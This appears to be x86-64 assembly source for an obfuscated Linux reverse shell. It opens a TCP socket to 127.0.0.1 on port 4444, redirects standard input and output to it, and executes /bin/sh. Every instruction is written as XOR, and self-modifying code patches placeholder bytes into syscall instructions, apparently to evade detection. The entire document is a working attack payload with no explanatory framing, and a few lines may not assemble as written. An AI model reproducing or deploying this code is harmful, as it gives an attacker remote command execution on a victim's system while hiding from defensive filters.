global _start

struc sockaddr_in
    .sin_family      resw    1
    .sin_port        resw    1
    .sin_addr        resd    1
    .sin_zero        resb    8
endstruc

section .data
    sh          db '/bin/sh', 0

section .bss
    addr_in     resb    sockaddr_in_size

section .text

_start:
    xor rax, ._s0
    xor BYTE [rax], 0x3e
    xor BYTE [rax + 1], 0xc5

    xor eax, eax
    xor rax, ._s1
    xor BYTE [rax], 0x3e
    xor BYTE [rax + 1], 0xc5

    xor eax, eax
    xor rax, ._s2
    xor BYTE [rax], 0x3e
    xor BYTE [rax + 1], 0xc5

    xor eax, eax
    xor rax, ._s3
    xor BYTE [rax], 0x3e
    xor BYTE [rax + 1], 0xc5

    xor eax, eax
    xor rax, ._s4
    xor BYTE [rax], 0x3e
    xor BYTE [rax + 1], 0xc5

    xor eax, eax
    xor rax, ._s5
    xor BYTE [rax], 0x3e
    xor BYTE [rax + 1], 0xc5

    xor eax, eax
    

    xor eax, 0x29       ; sys_socket
    xor edi, 0x2        ; AF_INET
    xor esi, 0x1        ; SOCK_STREAM

._s0:
    xor eax, eax

    xor ebx, eax
    xor edi, edi
    xor edi, eax

    xor eax, eax
    xor eax, 0x2        ; AF_INET
    xor WORD [addr_in + sockaddr_in.sin_family], ax

    xor eax, eax
    xor eax, 0x5c11     ; 4444
    xor WORD [addr_in + sockaddr_in.sin_port], ax

    xor eax, eax
    xor eax, 0x100007f ; 127.0.0.1
    xor DWORD [addr_in + sockaddr_in.sin_addr], eax

    xor esi, esi
    xor rsi, addr_in
    
    xor edx, edx
    xor edx, sockaddr_in_size

    xor eax, eax
    xor eax, 0x2a       ; sys_connect

._s1:
    xor eax, eax

    xor eax, eax
    xor eax, 0x21       ; sys_dup2
    xor edi, edi        ; stdin
    xor edi, ebx
    xor esi, esi

._s2:
    xor eax, eax

    xor eax, eax
    xor eax, 0x21       ; sys_dup2
    xor esi, 0x1        ; stdout

._s3:
    xor eax, eax

    xor eax, eax
    xor eax, 0x21       ; sys_dup2
    xor esi, 0x3        ; stderr

._s4:
    xor eax, eax

    xor eax, eax
    xor eax, 0x3b       ; sys_execve
    xor edi, edi
    xor edi, sh
    xor esi, esi
    xor edx, edx

._s5:
    xor eax, eax
